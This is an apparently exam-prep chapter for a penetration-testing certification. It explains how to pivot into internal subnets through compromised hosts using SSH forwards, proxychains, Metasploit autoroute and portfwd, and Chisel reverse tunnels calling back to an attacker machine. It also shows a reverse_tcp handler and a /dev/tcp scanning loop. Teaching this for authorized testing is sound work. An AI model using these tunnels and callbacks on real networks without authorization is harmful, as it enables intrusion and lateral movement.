# 11 — Pivoting, Tunneling, and Port Forwarding

Pivoting is MORE important on the CPTS than on the OSCP. The CPTS exam network has multiple subnets separated by firewalls — you MUST pivot through compromised hosts to reach internal targets. You'll likely need to set up multiple tunnels, possibly chained through two or more hosts.

---

## When You Need to Pivot

```
You compromised Host A. Running ip a shows two interfaces:
  eth0: 10.10.10.15/24  (your network — you can reach this)
  eth1: 172.16.0.5/24   (internal network — you can't reach this directly)

Host A can reach 172.16.0.0/24. Your Kali cannot.
To attack machines on 172.16.0.0/24, you route traffic through Host A.
```

---

## SSH Tunneling

### Local port forward — access ONE internal service

```bash
ssh -L 8080:172.16.0.10:80 user@10.10.10.15
```

**What this creates:**

```
Kali localhost:8080  →  SSH tunnel through Host A  →  172.16.0.10:80

Now on Kali:
  curl http://localhost:8080    hits the internal web server at 172.16.0.10:80
```

**Multiple ports in one command:**

```bash
ssh -L 8080:172.16.0.10:80 -L 4445:172.16.0.10:445 -L 2222:172.16.0.20:22 user@10.10.10.15
```

Now `localhost:8080` → internal web, `localhost:4445` → internal SMB, `localhost:2222` → SSH on another internal host.

### Dynamic port forward (SOCKS proxy) — access EVERYTHING internal

```bash
ssh -D 9050 -fN user@10.10.10.15
```

```
-D 9050    Create a SOCKS proxy on Kali port 9050
-f         Fork to background (don't show a shell)
-N         No command — just hold the tunnel open
```

**Configure proxychains:**

```bash
# Edit /etc/proxychains4.conf
# Last line should be:
socks5 127.0.0.1 9050
```

**Use ANY tool through the tunnel:**

```bash
proxychains nmap -sT -Pn 172.16.0.0/24 -p 22,80,445
proxychains curl http://172.16.0.10
proxychains evil-winrm -i 172.16.0.20 -u admin -p pass
proxychains smbclient -L //172.16.0.20 -U admin
proxychains crackmapexec smb 172.16.0.0/24 -u user -p pass

# Browser: set SOCKS proxy to 127.0.0.1:9050 in Firefox
# Then browse to http://172.16.0.10 directly
```

**Critical rule:** Use `-sT` (TCP connect) with nmap through proxychains. SYN scans (`-sS`) send raw packets that can't go through a SOCKS proxy.

### Reverse port forward — when you can't SSH to the pivot

```bash
# From the compromised host (Host A) back to Kali
ssh -R 9090:172.16.0.10:80 kali_user@KALI_IP
```

**What this creates:**

```
Kali localhost:9090  ←  reverse tunnel from Host A  ←  172.16.0.10:80

Host A initiates the connection TO Kali (outbound SSH).
Kali port 9090 reaches the internal web server.
```

**When to use:** When the firewall blocks inbound SSH to Host A but allows outbound. The tunnel is established from Host A TO Kali (outbound), then traffic flows back through it.

### SSH jump (-J) — chain through multiple hosts

```bash
ssh -J user@10.10.10.15 user@172.16.0.20
```

**What this does:** SSH to Host A first, then FROM Host A SSH to 172.16.0.20. One command, two hops. You end up on 172.16.0.20.

**Double SOCKS proxy through two hops:**

```bash
ssh -D 9050 -J user@10.10.10.15 user@172.16.0.20
```

SOCKS proxy exits from 172.16.0.20 — useful when there's a THIRD network behind 172.16.0.20.

---

## Metasploit Pivoting

### Autoroute — route traffic through a Meterpreter session

```bash
# You have a Meterpreter session on Host A (session 1)
meterpreter> run autoroute -s 172.16.0.0/24

# Now ANY Metasploit module can target 172.16.0.0/24
# Traffic is automatically routed through session 1

use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.0.10
set PORTS 22,80,445,3389
run
# This scan goes through the Meterpreter session to the internal network
```

### SOCKS proxy through Meterpreter

```bash
# After setting up autoroute
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j

# Configure proxychains: socks5 127.0.0.1 1080
# Now external tools work through the Meterpreter session
proxychains nmap -sT -Pn 172.16.0.10
proxychains curl http://172.16.0.10
```

### Port forwarding through Meterpreter

```bash
# Forward local port to internal target
meterpreter> portfwd add -l 8080 -p 80 -r 172.16.0.10
# Kali localhost:8080 → 172.16.0.10:80

meterpreter> portfwd add -l 4445 -p 445 -r 172.16.0.20
# Kali localhost:4445 → 172.16.0.20:445

meterpreter> portfwd list
meterpreter> portfwd delete -l 8080 -p 80 -r 172.16.0.10
```

---

## Chisel — When SSH Isn't Available

Chisel creates tunnels without SSH. Useful when the compromised host doesn't have SSH or when SSH forwarding is disabled.

### Setup

```bash
# Download Chisel to Kali (it's a single binary)
# Transfer the appropriate binary to the target

# On Kali — start the Chisel server
chisel server --reverse -p 8000

# On the compromised host — connect back to Kali
./chisel client KALI_IP:8000 R:socks
# Creates a reverse SOCKS proxy
# Configure proxychains: socks5 127.0.0.1 1080
```

### Chisel port forward

```bash
# On Kali
chisel server --reverse -p 8000

# On target — forward specific ports
./chisel client KALI_IP:8000 R:8080:172.16.0.10:80
# Kali localhost:8080 → 172.16.0.10:80

# Multiple ports
./chisel client KALI_IP:8000 R:8080:172.16.0.10:80 R:4445:172.16.0.20:445
```

---

## Double Pivoting (two hops)

The CPTS exam may require reaching a network that's TWO hops away:

```
Kali → Host A (10.10.10.15) → Host B (172.16.0.20) → Host C (192.168.50.10)
       (external)              (DMZ)                    (internal)
```

### Method 1: Chained SSH

```bash
# Hop 1: SOCKS proxy through Host A
ssh -D 9050 -fN user@10.10.10.15

# Hop 2: SSH through the proxy to Host B, create a second SOCKS proxy
proxychains ssh -D 9051 -fN user@172.16.0.20

# Update proxychains.conf to chain both proxies
# /etc/proxychains4.conf:
# strict_chain
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 9051

# Now traffic goes: Kali → Host A → Host B → target
proxychains nmap -sT -Pn 192.168.50.10
```

### Method 2: SSH jump + SOCKS

```bash
ssh -D 9050 -J user@10.10.10.15,user@172.16.0.20 user@192.168.50.10
# Chains through two jump hosts
# SOCKS proxy exits from 192.168.50.10
```

### Method 3: Metasploit multi-hop

```bash
# Session 1: Meterpreter on Host A
run autoroute -s 172.16.0.0/24

# Exploit Host B through session 1
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
exploit
# Get session 2 on Host B

# Session 2: Add route to the third network
sessions -i 2
run autoroute -s 192.168.50.0/24

# Now Metasploit can reach 192.168.50.0/24 through session 1 → session 2
```

---

## Pivoting Decision Tree

```
Can you SSH to the pivot host?
├── YES → ssh -D 9050 user@PIVOT (SOCKS proxy — best option)
│         Use proxychains for everything
│
├── NO SSH but have Meterpreter? → autoroute + socks_proxy
│
├── No SSH, no Meterpreter, but can upload files?
│   → Upload Chisel → chisel client KALI:8000 R:socks
│
└── Can't upload anything?
    → Use the shell you have to scan manually
      for i in $(seq 1 254); do (echo >/dev/tcp/172.16.0.$i/80) 2>/dev/null && echo "172.16.0.$i:80 open"; done
```

---

## Proxychains Tips

```bash
# Use socks5 (not socks4) for DNS resolution through the proxy
# In /etc/proxychains4.conf:
#   strict_chain (fail if any proxy in chain is down)
#   or dynamic_chain (skip dead proxies)
#   proxy_dns (resolve DNS through the proxy too)

# Tools that DON'T work through proxychains:
#   nmap -sS (SYN scan — use -sT instead)
#   nmap -sU (UDP scan — doesn't work through SOCKS)
#   ping (ICMP — use -Pn with nmap instead)

# Tools that WORK through proxychains:
#   nmap -sT -Pn
#   curl, wget
#   evil-winrm
#   smbclient, crackmapexec
#   ssh
#   impacket tools (psexec, secretsdump, etc.)
```
